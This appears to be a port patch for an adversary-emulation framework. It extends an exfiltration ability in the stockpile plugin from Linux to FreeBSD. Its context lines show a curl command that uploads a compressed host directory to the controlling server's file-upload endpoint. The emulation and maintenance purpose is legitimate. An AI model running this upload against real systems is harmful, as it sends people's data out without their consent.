@@ -1,0 +1,11 @@
+--- plugins/stockpile/data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml.orig	2022-09-14 02:24:22 UTC
++++ plugins/stockpile/data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml
+@@ -12,7 +12,7 @@
+       sh:
+         command: |
+           curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+-    linux:
++    freebsd,linux:
+       sh:
+         command: |
+           curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
